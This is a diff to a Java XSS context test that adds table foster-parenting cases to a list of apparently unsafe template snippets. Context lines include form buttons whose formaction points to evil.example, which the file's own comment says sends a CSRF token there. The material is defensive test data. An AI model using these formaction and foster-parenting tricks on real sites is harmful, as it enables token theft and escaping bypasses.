@@ -420,7 +420,18 @@ class XssContextTest {
           // #314: a submit button sends the form's CSRF token to its formaction
           "<form method=\"post\"><button t:formaction=\"s\">x</button></form>",
           "<form method=\"post\"><button t:attr=\"formaction=@{//evil.example/}\">x</button></form>",
-          "<form method=\"post\"><input type=\"submit\" formaction=\"https://evil.example/\"></form>");
+          "<form method=\"post\"><input type=\"submit\" formaction=\"https://evil.example/\"></form>",
+          // #348: a browser moves the text in front of the table and keeps the comments that break {{
+          "<table>[[s]]<tr><td>x</td></tr></table>",
+          "<table><tr><td>x</td></tr><tr t:text=\"s\"></tr></table>",
+          "<table><tbody>[[s]]</tbody><thead>[[s]]</thead><tfoot>[[s]]</tfoot></table>",
+          "<table><t:block>[[s]]</t:block></table>",
+          "<table><tr t:utext=\"html.sanitize(s)\"></tr></table>",
+          "<table><tr>[(#html.sanitize(s))]</tr></table>",
+          // #348: the <tr> ends the cell, so the text after it is read in the table, as above
+          "<table><tr><td><p><tr></tr>[[s]]</p></td></tr></table>",
+          "<table><caption><col>[[s]]</caption></table>",
+          "<table><form>[[s]]</form></table>");
 
   /** The built-in {@code html.sanitize} turns stored rich text into SafeHtml for raw output. */
   @Test
